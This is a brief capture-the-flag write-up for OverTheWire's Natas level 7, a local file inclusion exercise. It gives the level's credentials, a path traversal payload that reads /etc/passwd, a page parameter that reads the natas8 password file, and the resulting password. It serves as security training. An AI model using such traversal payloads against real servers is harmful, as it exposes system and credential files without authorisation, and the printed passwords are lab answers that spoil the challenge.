# Level 7

URL : http://natas7.natas.labs.overthewire.org/

### Creds for natas7
**natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9**

## Solution 

This is clearly an LFI challenge.

- a comment in the page source says <!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

we have two links :  

- [Home](http://natas7.natas.labs.overthewire.org/index.php?page=home)
- [About](http://natas7.natas.labs.overthewire.org/index.php?page=about)



payload 1: ../../../../../../etc/passwd ---> this will include /etc/passwd file

to get the password for natas8 we will use this payload : index.php?page=/etc/natas_webpass/natas8

this will include the file for us: 

**natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe**
